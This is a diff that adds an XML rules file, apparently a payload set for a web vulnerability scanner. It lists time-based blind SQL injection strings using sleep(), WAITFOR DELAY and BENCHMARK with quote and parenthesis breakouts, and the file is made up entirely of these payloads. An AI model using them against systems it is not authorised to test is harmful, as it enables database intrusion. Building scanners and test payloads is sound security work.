@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <requests>
+            1+or+sleep(TIME_VAR)%23
+            '+and+sleep(TIME_VAR)%23
+            "+and+sleep(TIME_VAR)%23
+            +and+sleep(TIME_VAR)%23
+            )+and+sleep(TIME_VAR)%23
+            ')+and+sleep(TIME_VAR)%23
+            '))+and+sleep(TIME_VAR)%23
+            ")+and+sleep(TIME_VAR)%23
+            "))+and+sleep(TIME_VAR)%23
+            ;WAITFOR DELAY '00:00:TIME_VAR';--
+            ';WAITFOR DELAY '00:00:TIME_VAR';--
+            ');WAITFOR DELAY '00:00:TIME_VAR';--
+            );WAITFOR DELAY '00:00:TIME_VAR';--
+            ";WAITFOR DELAY '00:00:TIME_VAR';-- 
+        </requests>
+    </couple>
+    <couple id="2">
+        <requests>
+            +and+sleep(TIME_VAR)-- t
+            )+and+sleep(TIME_VAR)-- t
+            "+and+sleep(TIME_VAR)-- t
+            ')+and+sleep(TIME_VAR)-- t
+            '))+and+sleep(TIME_VAR)-- t
+            '+and+sleep(TIME_VAR)-- t
+            1+or+sleep(TIME_VAR)-- t
+            ")+and+sleep(TIME_VAR)-- t
+            "))+and+sleep(TIME_VAR)-- t
+        </requests>
+    </couple>
+    <couple id="3">
+        <requests>
+            %20AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))-- t
+            %20OR SLEEP(TIME_VAR)-- t
+            ' AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))-- t
+            ' OR SLEEP(TIME_VAR)-- t
+            ') AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))-- t
+            ') OR SLEEP(TIME_VAR)-- t
+            ") AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))-- t
+            ") OR SLEEP(TIME_VAR)-- t
+            " AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))%23
+            " OR SLEEP(TIME_VAR)%23
+            %20AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))%23
+            %20OR SLEEP(TIME_VAR)%23
+            ' AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))%23
+            ' OR SLEEP(TIME_VAR)%23
+            ') AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))%23
+            ') OR SLEEP(TIME_VAR)%23
+            ") AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))%23
+            ") OR SLEEP(TIME_VAR)%23
+            " AND 9436=BENCHMARK(NUM_VAR,MD5(0x7852554f))%23
+            " OR SLEEP(TIME_VAR)%23
+        </requests>
+    </couple>
+</rules>
